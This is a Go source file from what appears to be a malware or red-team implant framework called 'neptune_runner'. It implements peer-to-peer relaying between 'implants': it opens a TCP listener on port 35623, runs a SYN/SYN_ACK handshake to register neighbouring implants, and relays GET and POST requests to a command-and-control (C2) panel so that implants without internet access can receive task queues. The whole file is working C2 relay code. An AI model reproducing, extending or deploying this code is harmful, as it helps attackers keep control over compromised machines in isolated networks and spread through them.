package communication

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"neptune_runner/config"
	"neptune_runner/logging"
	"net"
	"os"
	"strconv"
	"time"
)

func SyncWithNewImplant(task config.WrappedTaskStep) {
	logging.Info("P2P sync initiated by master implant to implant without internet access")

	numberOfRetries := 1

	address := task.TaskStepRequest.Payload["address"]

	message := SynMessage{
		BaseMessageFormat: BaseMessageFormat{
			MessageType: SYN,
			ImplantGUID: config.GlobalState.Id,
		},
		HaveInternetAccess: config.GlobalState.HaveInternetAccess(),
	}

	fullAddress := address + ":35623"

	jsonEncoded, _ := json.Marshal(message)

	conn, err := net.Dial("tcp", fullAddress)

	counter := 0

	for err != nil && counter < numberOfRetries {
		counter++

		fmt.Println("Couldn't connect to implant. Retrying in " + strconv.Itoa(config.P2P_RETRY_TIMEOUT) + " seconds ...")
		fmt.Println(err)

		time.Sleep(config.P2P_RETRY_TIMEOUT * time.Second)

		conn, err = net.Dial("tcp", fullAddress)
	}

	if counter == numberOfRetries {
		task.TaskStepResponse.StatusId = TASK_ERROR
		task.TaskStepResponse.Data = base64.StdEncoding.EncodeToString([]byte("Implant failed to connect to the requested implant"))
	} else {
		task.TaskStepResponse.StatusId = TASK_SUCCESS
		task.TaskStepResponse.Data = base64.StdEncoding.EncodeToString([]byte("Implant connected successfully to the requested implant"))
	}

	//output := base64.StdEncoding.EncodeToString([]byte(task.TaskStepResponse.Data))

	//task.TaskStepResponse.Data = output

	ReplyToTask(task)

	if err == nil {
		_, _ = conn.Write(jsonEncoded)
		_, _ = conn.Write([]byte{0x0a}) // must send a new line

		go handleRequest(conn)
	}
}

func SetupPeer2PeerListeners() {
	l, err := net.Listen("tcp", "0.0.0.0:35623")

	if err != nil {
		log.Fatal(err)
	}

	defer l.Close()

	for {
		// Listen for an incoming connection.
		conn, err := l.Accept()

		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}

		// Handle connections in a new goroutine.
		go handleRequest(conn)
	}
}

func handleRequest(conn net.Conn) {
	for {
		r := bufio.NewReader(conn)

		line, _, _ := r.ReadLine()

		// If TCP is closed/broken, get out of here
		if len(line) == 0 {
			conn.Close()
			break
		}

		handleReceivedMessage(line, conn)
	}
}

func handleReceivedMessage(rawMessage []byte, conn net.Conn) {
	var message BaseMessageFormat

	err := json.Unmarshal(rawMessage, &message)

	if err != nil {
		fmt.Println(err)
		return
	}

	messageType, ok := message.GetMessageType()

	if !ok {
		return
	}

	switch messageType {
	case SYN:
		implantGUID := handleSynMessage(rawMessage, conn)

		sendSYNACK(implantGUID)
	case SYN_ACK:
		handleSynMessage(rawMessage, conn)
	case RELAY_POST_TO_C2:
		handleMessageToC2(rawMessage)
	case RELAY_GET_TO_C2:
		handleMessageToC2(rawMessage)
	case RELAY_GET_FROM_C2:
		handleMessageFromC2(rawMessage)
	default:
		// Discard the message because it is of unknown type
	}
}

func sendSYNACK(implantGUID string) {
	message := SynMessage{
		BaseMessageFormat: BaseMessageFormat{
			MessageType: SYN_ACK,
			ImplantGUID: config.GlobalState.Id,
		},
		HaveInternetAccess: config.GlobalState.HaveInternetAccess(),
	}

	jsonEncoded, _ := json.Marshal(message)

	config.GlobalState.Neighbors[implantGUID].SendBytes(jsonEncoded)
}

func handleSynMessage(rawMessage []byte, conn net.Conn) string {
	var syncMessage SynMessage

	_ = json.Unmarshal(rawMessage, &syncMessage)

	var internetConnectivityType int

	if syncMessage.HaveInternetAccess {
		internetConnectivityType = config.Internet
	} else {
		internetConnectivityType = config.Peer2Peer
	}

	config.GlobalState.AddNeighbor(syncMessage.ImplantGUID, config.NeighborStructure{
		Id:                       syncMessage.ImplantGUID,
		InternetConnectivityType: internetConnectivityType,
		P2PChannel:               config.TCP,
		Socket:                   conn,
	})

	logging.Info("ADDED NEW NEIGHBOR")

	return syncMessage.ImplantGUID
}

func handleMessageToC2(rawMessage []byte) {
	var message P2P_RELAY_STRUCTURE

	_ = json.Unmarshal(rawMessage, &message)

	if message.MessageType == RELAY_POST_TO_C2 {
		SendPostToC2Panel(message.ApiPath, message.Data)
	} else if message.MessageType == RELAY_GET_TO_C2 {
		caller, ok := config.GlobalState.Neighbors[message.BaseMessageFormat.ImplantGUID]

		if ok {
			output := SendGetToC2Panel(message.ApiPath)

			if output != nil {
				data := P2P_MESSAGE_FROM_C2{
					BaseMessageFormat: BaseMessageFormat{
						MessageType: RELAY_GET_FROM_C2,
					},
					Data: output,
				}

				jsonEncoded, _ := json.Marshal(data)

				caller.SendBytes(jsonEncoded)
			}
		} else {
			logging.Info("No direct neighbor relationship with the requested implant")
		}
	}
}

func handleMessageFromC2(rawMessage []byte) {
	var message P2P_MESSAGE_FROM_C2

	_ = json.Unmarshal(rawMessage, &message)

	var tasks []config.TaskRequest

	_ = json.Unmarshal(message.Data, &tasks)

	config.GlobalState.AddTasksToQueue(tasks)
}
